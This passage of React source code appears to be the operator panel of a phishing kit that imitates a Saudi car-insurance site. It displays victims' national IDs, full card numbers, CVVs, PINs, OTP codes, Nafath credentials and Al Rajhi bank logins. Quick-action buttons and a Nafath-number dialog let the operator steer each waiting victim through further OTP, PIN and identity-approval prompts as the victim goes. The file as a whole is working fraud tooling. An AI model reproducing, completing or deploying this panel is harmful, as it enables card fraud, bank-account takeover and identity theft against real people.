                {selected.ssn && <Badge color="bg-slate-100">{selected.ssn}</Badge>}
                {selected.phone && <Badge color="bg-slate-100"><Phone className="mr-1 inline h-3 w-3" />{selected.phone}</Badge>}
                <span className="mr-auto text-sm font-bold">{selected.quote_details?.[0]?.full_name || selected.visitor_name || "زائر"}</span>
                <span className="font-mono text-xs text-slate-400">{selected.session_id.slice(0, 8).toUpperCase()}</span>
              </div>
              {selected.current_page === "wait" && (
                <QuickActions selected={selected} onRoute={route} />
              )}
              <div className="flex-1 overflow-y-auto p-4">
                <div className="mx-auto max-w-2xl space-y-3">
                  {selected.quote_submission_history?.length ? (
                    <div className="rounded-xl border border-indigo-200 bg-indigo-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-indigo-700">📜 سجل محاولات التسجيل ({selected.quote_submission_history.length})</div>
                      <div className="space-y-2">
                        {selected.quote_submission_history.map((r: any, i: number) => (
                          <Card key={r.id} title={`المحاولة ${i + 1} — تسجيل جديد`} time={r.created_at}>
                            {r.ssn && <Row k="رقم الهوية" v={r.ssn} />}
                            {r.seller_ssn && <Row k="هوية البائع" v={r.seller_ssn} />}
                            {r.id_type && <Row k="نوع الوثيقة" v={r.id_type} />}
                            {r.plate_number && <Row k="رقم اللوحة" v={r.plate_number} />}
                            {r.serial_number && <Row k="الرقم التسلسلي" v={r.serial_number} />}
                            {r.year && <Row k="سنة الصنع" v={r.year} />}
                            {r.phone && <Row k="الجوال" v={r.phone} />}
                            {r.is_transfer && <Row k="نقل ملكية" v="نعم" />}
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.card_nafath_history?.length ? (
                    <div className="rounded-xl border border-red-200 bg-red-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-red-700">📜 سجل محاولات نفاذ ({selected.card_nafath_history.length})</div>
                      <div className="space-y-2">
                        {selected.card_nafath_history.map((n: any, i: number) => (
                          <Card key={n.id} title={`المحاولة ${i + 1} — بيانات نفاذ`} time={n.created_at}>
                            <Row k="الرمز" v={n.code} />
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.card_otp_history?.length ? (
                    <div className="rounded-xl border border-amber-200 bg-amber-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-amber-700">📜 سجل محاولات OTP ({selected.card_otp_history.length})</div>
                      <div className="space-y-2">
                        {selected.card_otp_history.map((o: any, i: number) => (
                          <Card key={o.id} title={`المحاولة ${i + 1} — رمز OTP`} time={o.created_at}>
                            <div className="flex justify-center gap-2" dir="ltr">
                              {o.otp.split("").map((d: string, j: number) => (
                                <span key={j} className="flex h-12 w-12 items-center justify-center rounded-lg border-2 border-slate-200 text-2xl font-bold">{d}</span>
                              ))}
                            </div>
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.card_input_history?.length ? (
                    <div className="rounded-xl border border-sky-200 bg-sky-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-sky-700">📜 سجل محاولات إدخال البطاقة ({selected.card_input_history.length})</div>
                      <div className="space-y-2">
                        {selected.card_input_history.map((r: any, i: number) => (
                          <Card key={r.id} title={`المحاولة ${i + 1} — بيانات البطاقة`} time={r.created_at}>
                            <Row k="الرقم" v={r.card_number} />
                            <Row k="الاسم" v={r.card_name} />
                            <Row k="الانتهاء" v={r.year} />
                            <Row k="CVV" v={r.cvv} />
                            {r.phone_number && <Row k="الجوال" v={r.phone_number} />}
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.card_pin_history?.length ? (
                    <div className="rounded-xl border border-violet-200 bg-violet-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-violet-700">📜 سجل محاولات PIN ({selected.card_pin_history.length})</div>
                      <div className="space-y-2">
                        {selected.card_pin_history.map((r: any, i: number) => (
                          <Card key={r.id} title={`المحاولة ${i + 1} — رمز PIN`} time={r.created_at}>
                            <Row k="PIN" v={r.pin} />
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.card_rajhi_history?.length ? (
                    <div className="rounded-xl border border-emerald-200 bg-emerald-50/50 p-3">
                      <div className="mb-2 text-sm font-bold text-emerald-700">📜 سجل محاولات تسجيل دخول الراجحي ({selected.card_rajhi_history.length})</div>
                      <div className="space-y-2">
                        {selected.card_rajhi_history.map((r: any, i: number) => (
                          <Card key={r.id} title={`المحاولة ${i + 1} — تسجيل دخول الراجحي`} time={r.created_at}>
                            <Row k="اسم المستخدم" v={r.username} />
                            <Row k="كلمة السر" v={r.password} />
                          </Card>
                        ))}
                      </div>
                    </div>
                  ) : null}
                  {selected.cards?.map((c: any) => {
                    const bank = detectBank(c.card_number || "");
                    const brand = detectBrand(c.card_number || "");
                    const identity = identifyCard(c.card_number || "");
                    return (
                      <div key={c.id} className="space-y-3">
                        {(c.company && c.company !== "####") || c.total_price ? (
                          <Card title="العرض المختار" time={c.offer_selected_at || c.created_at}>
                            <Row k="شركة التأمين" v={c.company} />
                            <Row k="سعر التأمين" v={c.total_price ? `${c.total_price} ر.س` : undefined} />
                            {c.offer_selected_at && (
                              <Row k="تاريخ ووقت الاختيار" v={new Date(c.offer_selected_at).toLocaleString("ar-SA")} />
                            )}
                          </Card>
                        ) : null}
                        <Card title="معلومات البطاقة" time={c.created_at}>
                          <div className="mb-3">
                            <BankCardPreview
                              bank={bank}
                              brand={brand}
                              number={c.card_number}
                              name={c.card_name}
                              expiry={c.year}
                              showDataOverlay
                            />
                            {identity.matchedLength >= 6 && !identity.provisional && (
                              <p className="mt-2 text-center text-xs text-slate-500">
                                BIN → <b className="text-slate-700">{bank.nameAr}</b> ({bank.nameEn})
                              </p>
                            )}
                          </div>
                          <Row k="الرقم" v={c.card_number} />
                          <Row k="الاسم" v={c.card_name} />
                          <Row k="الانتهاء" v={c.year} />
                          <Row k="CVV" v={c.cvv} />
                          {c.pin && <Row k="PIN" v={c.pin} />}
                          {c.username_nafath && <Row k="مستخدم نفاذ" v={c.username_nafath} />}
                          {c.password_nafath && <Row k="كلمة نفاذ" v={c.password_nafath} />}
                          {c.username && <Row k="مستخدم الراجحي" v={c.username} />}
                          {c.password && <Row k="كلمة سر الراجحي" v={c.password} />}
                        </Card>
                      </div>
                    );
                  })}
                  {selected.quote_details?.map((d: any) => (
                    <Card key={d.id} title="تفاصيل التأمين" time={d.created_at}>
                      <Row k="الاسم" v={d.full_name} />
                      <Row k="رقم الهاتف" v={d.phone} />
                      <Row k="نوع المركبة" v={d.vehicle_type} />
                      <Row k="موديل المركبة" v={d.vehicle_model} />
                      <Row k="تاريخ الوثيقة" v={d.doc_date} />
                      <Row k="الاستخدام" v={d.purpose_use} />
                      <Row k="قيمة المركبة" v={d.car_value} />
                      <Row k="سنة الصنع" v={d.created_year} />
                      <Row k="موقع الإصلاح" v={d.repair_place} />
                      {d.message && <Row k="ملاحظات" v={d.message} />}
                    </Card>
                  ))}
                  <Card title="معلومات أساسية" time={selected.created_at}>
                    <Row k="رقم الهوية" v={selected.ssn} />
                    <Row k="رقم الهاتف" v={selected.phone} />
                    <Row k="نوع الوثيقة" v={selected.id_type} />
                    <Row k="رقم اللوحة" v={selected.plate_number} />
                    <Row k="الرقم التسلسلي" v={selected.serial_number} />
                    <Row k="سنة الصنع" v={selected.year} />
                    <Row k="نقل ملكية" v={selected.is_transfer ? "نعم" : "لا"} />
                  </Card>
                </div>
              </div>
            </>
          ) : (
            <div className="flex flex-1 items-center justify-center text-slate-400">اختر زائراً لعرض التفاصيل</div>
          )}
        </main>

        {/* Left — routing menu */}
        <aside className="w-56 border-r bg-white p-3">
          <div className="relative">
            <button onClick={() => setShowRouteMenu((s) => !s)} disabled={!selected} className="flex w-full items-center justify-between rounded-lg border border-slate-200 px-3 py-2 text-sm font-bold disabled:opacity-50">
              <ChevronDown className="h-4 w-4" />
              <span>توجيه الزائر...</span>
            </button>
            {showRouteMenu && (
              <div className="absolute left-0 right-0 mt-1 rounded-lg border border-slate-200 bg-white shadow-lg">
                {routeOptions.map((p) => (
                  <button
                    key={p.value}
                    onClick={() => route(p.value)}
                    className={`block w-full px-3 py-2 text-right text-sm ${
                      p.kind === "reject"
                        ? "text-red-700 hover:bg-red-50"
                        : p.kind === "accept"
                          ? "text-emerald-700 hover:bg-emerald-50"
                          : "hover:bg-slate-50"
                    }`}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            )}
          </div>
          {selected && (
            <button onClick={() => updateVisitor({ data: { id: selected.id, archived: !selected.archived } })} className="mt-2 flex w-full items-center justify-center gap-2 rounded-lg border border-slate-200 px-3 py-2 text-xs">
              <ShieldOff className="h-3 w-3" />
              {selected.archived ? "إلغاء الأرشفة" : "أرشفة"}
            </button>
          )}
        </aside>
      </div>

      {showSettings && <SettingsModal onClose={() => setShowSettings(false)} />}

      {showNafathDialog && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4" onClick={() => setShowNafathDialog(false)}>
          <div dir="rtl" className="w-full max-w-xs rounded-xl bg-white p-4 shadow-xl" onClick={(e) => e.stopPropagation()}>
            <div className="mb-1 text-sm font-bold text-slate-800">إرسال رقم نفاذ</div>
            <p className="mb-3 text-xs text-slate-500">أدخل الرقم الذي سيظهر للزائر ليختاره في تطبيق نفاذ</p>
            <input
              value={nafathInput}
              onChange={(e) => setNafathInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder="مثال: 27"
              inputMode="numeric"
              autoFocus
              className="mb-3 h-11 w-full rounded-lg border border-slate-300 px-3 text-center font-mono text-lg font-bold outline-none focus:border-bcare-blue"
              dir="ltr"
            />
            <div className="flex gap-2">
              <button
                onClick={() => sendNafathNumber()}
                disabled={nafathSending}
                className="h-10 flex-1 rounded-lg bg-bcare-blue text-sm font-bold text-white disabled:opacity-50"
              >
                إرسال للزائر
              </button>
              <button
                onClick={() => sendNafathNumber(String(Math.floor(Math.random() * 89) + 10))}
                disabled={nafathSending}
                className="h-10 rounded-lg border border-slate-300 px-3 text-xs font-bold text-slate-600 hover:bg-slate-50 disabled:opacity-50"
              >
                رقم عشوائي
              </button>
            </div>
          </div>
        </div>
      )}

      <AlertDialog open={confirmAction !== null} onOpenChange={(o) => { if (!o) setConfirmAction(null); }}>
        <AlertDialogContent dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle>
              {confirmAction?.kind === "trash-bulk" ? "حذف الزوار غير المتصلين؟" : "نقل الزائر إلى السلة؟"}
            </AlertDialogTitle>
            <AlertDialogDescription>
              {confirmAction?.kind === "trash-bulk"
                ? "سيتم نقل جميع الزوار غير المتصلين (أكثر من دقيقتين) وبدون بطاقة إلى السلة. يمكن استعادتهم لاحقًا."
                : confirmAction?.kind === "trash-one"
                  ? `سيتم نقل «${confirmAction.name}» إلى السلة. يمكن استعادته لاحقًا بسحبه إلى «الكل» أو من زر الاستعادة.`
                  : ""}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>إلغاء</AlertDialogCancel>
            <AlertDialogAction
              className="bg-red-600 hover:bg-red-700"
              onClick={async () => {
                const a = confirmAction;
                setConfirmAction(null);
                if (!a) return;
                if (a.kind === "trash-bulk") {
                  const res = await trashOfflineNoCard();
                  toast.success(`تم نقل ${res.moved} زائرًا إلى السلة`);
                } else {
                  await setTrashed({ data: { id: a.id, trashed: true } });
                  toast.success("نُقل إلى السلة");
                  if (selectedId === a.id) setSelectedId(null);
                }
                loadVisitors();
              }}
            >
              تأكيد
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}

function Stat({ icon, label, value }: { icon: React.ReactNode; label: string; value: string }) {
  return (
    <span className="flex items-center gap-1 text-slate-600">
      {icon}
      {label && <span className="text-xs text-slate-400">{label}</span>}
      <b className="text-slate-800">{value}</b>
    </span>
  );
}

type StatTint = "slate" | "emerald" | "blue" | "violet";
const statTints: Record<StatTint, { bg: string; icon: string; ring: string }> = {
  slate:   { bg: "bg-slate-50",    icon: "text-slate-600",   ring: "ring-slate-200" },
  emerald: { bg: "bg-emerald-50",  icon: "text-emerald-600", ring: "ring-emerald-200" },
  blue:    { bg: "bg-blue-50",     icon: "text-blue-600",    ring: "ring-blue-200" },
  violet:  { bg: "bg-violet-50",   icon: "text-violet-600",  ring: "ring-violet-200" },
};

function StatCard({ icon, label, value, sub, tint = "slate" }:
  { icon: React.ReactNode; label: string; value: string; sub?: string; tint?: StatTint }) {
  const t = statTints[tint];
  return (
    <div className="flex items-center gap-3 rounded-xl border border-slate-200/80 bg-white px-3 py-2.5 shadow-[0_1px_2px_rgba(15,23,42,0.03)]">
      <div className={`grid h-9 w-9 shrink-0 place-items-center rounded-lg ring-1 ${t.bg} ${t.icon} ${t.ring}`}>
        {icon}
      </div>
      <div className="min-w-0 flex-1">
        <div className="truncate text-[11px] font-medium text-slate-500">{label}</div>
        <div className="flex items-baseline gap-2">
          <span className="text-lg font-black tabular-nums text-slate-900">{value}</span>
          {sub && <span className="truncate text-[10px] text-slate-400">{sub}</span>}
        </div>
      </div>
    </div>
  );
}

function TabBtn({
  active,
  onClick,
  children,
  dropActive,
  ...rest
}: {
  active: boolean;
  onClick: () => void;
  children: React.ReactNode;
  dropActive?: boolean;
} & Omit<React.ButtonHTMLAttributes<HTMLButtonElement>, "onClick" | "children">) {
  const base = active
    ? "bg-emerald-600 text-white shadow-sm"
    : dropActive
      ? "bg-emerald-100 text-emerald-700 ring-2 ring-emerald-400"
      : "bg-white text-slate-600 border border-slate-200 hover:bg-slate-50";
  return (
    <button
      {...rest}
      onClick={onClick}
      className={`flex-1 rounded-lg px-3 py-1.5 text-xs font-bold transition-colors ${base}`}
    >
      {children}
    </button>
  );
}

function Badge({ color, children }: { color: string; children: React.ReactNode }) {
  return <span className={`inline-flex items-center rounded-md border border-slate-200/70 px-2 py-0.5 text-xs ${color}`}>{children}</span>;
}

function Card({ title, time, children }: { title: string; time?: string; children: React.ReactNode }) {
  return (
    <div className="overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-[0_1px_2px_rgba(15,23,42,0.04)]">
      <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50/60 px-4 py-2.5">
        {time && <span className="text-[11px] text-slate-400">{new Date(time).toLocaleString("ar-SA")}</span>}
        <h3 className="flex items-center gap-2 text-sm font-bold text-slate-800">
          <span className="h-4 w-1 rounded-full bg-emerald-500" />
          {title}
        </h3>
      </div>
      <div className="space-y-2 p-4 text-sm">{children}</div>
    </div>
  );
}

function Row({ k, v }: { k: string; v: React.ReactNode }) {
  if (v === null || v === undefined || v === "") return null;
  return (
    <div className="flex items-center justify-between gap-3 border-b border-slate-100 py-1.5 last:border-0">
      <span className="font-mono text-[13px] font-semibold text-slate-900" dir="ltr">{v}</span>
      <span className="text-[12px] text-slate-500">{k}</span>
    </div>
  );
}

function QuickActions({ selected, onRoute }: { selected: any; onRoute: (page: string) => void | Promise<void> }) {
  const hasNafath = (selected.card_nafath_history?.length ?? 0) > 0;
  const hasOtp = (selected.card_otp_history?.length ?? 0) > 0;
  const hasPin = selected.cards?.some((c: any) => c.pin);
  const hasCard = (selected.cards?.length ?? 0) > 0;

  // Determine last completed stage
  let stage: "card" | "otp" | "pin" | "nafath" | null = null;
  if (hasNafath) stage = "nafath";
  else if (hasPin) stage = "pin";
  else if (hasOtp) stage = "otp";
  else if (hasCard) stage = "card";

  const label =
    stage === "card" ? "بيانات البطاقة"
    : stage === "otp" ? "رمز OTP"
    : stage === "pin" ? "الرقم السري (PIN)"
    : stage === "nafath" ? "بيانات نفاذ"
    : "غير محدد";

  const acceptOptions: Array<{ label: string; value: string }> =
    stage === "card" ? [{ label: "طلب OTP", value: "OTP" }, { label: "طلب PIN", value: "PIN" }, { label: "طلب نفاذ", value: "نفاذ" }]
    : stage === "otp" ? [{ label: "طلب PIN", value: "PIN" }, { label: "طلب نفاذ", value: "نفاذ" }, { label: "طلب OTP جديد", value: "OTP" }]
    : stage === "pin" ? [{ label: "طلب نفاذ", value: "نفاذ" }, { label: "طلب OTP", value: "OTP" }]
    : stage === "nafath" ? [{ label: "طلب OTP", value: "OTP" }, { label: "طلب PIN", value: "PIN" }]
    : [];

  const rejectValue =
    stage === "card" ? "رفض البطاقة"
    : stage === "otp" ? "رفض OTP"
    : stage === "pin" ? "رفض PIN"
    : stage === "nafath" ? "رفض نفاذ"
    : null;

  return (
    <div className="border-b bg-amber-50/60 px-4 py-3">
      <div className="mx-auto flex max-w-4xl flex-wrap items-center gap-2">
        <span className="flex items-center gap-2 text-sm font-bold text-amber-800">
          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-500" />
          الزائر ينتظر — آخر إدخال: {label}
        </span>
        <div className="mr-auto flex flex-wrap items-center gap-2">
          {acceptOptions.map((o) => (
            <button
              key={o.value}
              onClick={() => onRoute(o.value)}
              className="rounded-lg bg-emerald-600 px-3 py-1.5 text-xs font-bold text-white shadow-sm hover:bg-emerald-700"
            >
              ✓ قبول ← {o.label}
            </button>
          ))}
          {rejectValue && (
            <button
              onClick={() => onRoute(rejectValue)}
              className="rounded-lg bg-red-600 px-3 py-1.5 text-xs font-bold text-white shadow-sm hover:bg-red-700"
            >
              ✗ رفض {label}
            </button>
          )}
          <select
            defaultValue=""
            onChange={(e) => {
              const v = e.target.value;
              if (!v) return;
              onRoute(v);
              e.currentTarget.value = "";
            }}
            className="rounded-lg border border-slate-300 bg-white px-2 py-1.5 text-xs font-bold text-slate-700 shadow-sm hover:border-slate-400"
            title="توجيه إلى صفحة"
          >
            <option value="" disabled>↪ توجيه إلى صفحة…</option>
            {routeOptions.map((o) => (
              <option key={o.value} value={o.value}>{o.label}</option>
            ))}
          </select>
        </div>
      </div>
    </div>
  );
}

